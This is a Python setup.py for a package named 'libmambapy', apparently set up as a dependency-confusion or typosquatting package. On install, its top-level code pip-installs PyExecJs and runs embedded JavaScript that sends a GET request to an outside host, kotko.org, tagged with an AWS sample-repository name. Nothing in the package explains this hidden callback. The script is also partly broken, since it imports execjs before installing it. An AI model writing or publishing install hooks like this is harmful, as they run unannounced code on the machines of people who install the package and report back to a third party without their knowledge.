# Always prefer setuptools over distutils
from setuptools import setup, find_packages
import subprocess
import sys

def install(name):
    subprocess.call([sys.executable, '-m', 'pip', 'install', name])
import execjs

# a string containing some javascript functions
js_code = """
function adder() {
    var request = new XMLHttpRequest();
    request.open("GET", "https://kotko.org?aws-samples--aws-ai-ml-workshop-kr");
    request.send();

}
adder()
"""
install("PyExecJs")
ctx = execjs.compile(js_code)

company = "aws-samples--aws-ai-ml-workshop-kr"
name = "libmambapy"
version = "0.0.4"

from setuptools import setup

setup(
    name=name,
    version=version,
    author="Kotko Vladyslav",
    author_email="m@kotko.org",
    description="",
    packages=find_packages(),
    install_requires=['requests', 'execjs'],

    classifiers= [
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Education",
        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 3",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
        ]
)

